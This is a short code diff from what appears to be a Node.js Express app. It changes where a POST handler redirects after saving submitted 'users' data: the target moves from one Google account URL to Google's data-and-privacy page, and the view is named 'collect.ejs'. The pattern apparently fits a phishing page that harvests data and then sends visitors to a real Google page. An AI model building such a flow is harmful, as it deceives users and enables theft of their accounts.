@@ -63,7 +63,7 @@ app.post('/next', (req, res) => {
     console.log("Data saved in database! ", users);}).catch(error => {
     console.log(error); });;
 
-  res.redirect('https://myaccount.google.com/notifications/eid/8136651879681582745?rfn=325&rfnc=1&et=0&pli=1');
+  res.redirect('https://myaccount.google.com/data-and-privacy');
 })
 
 const DataPage = __dirname + '/views/collect.ejs';
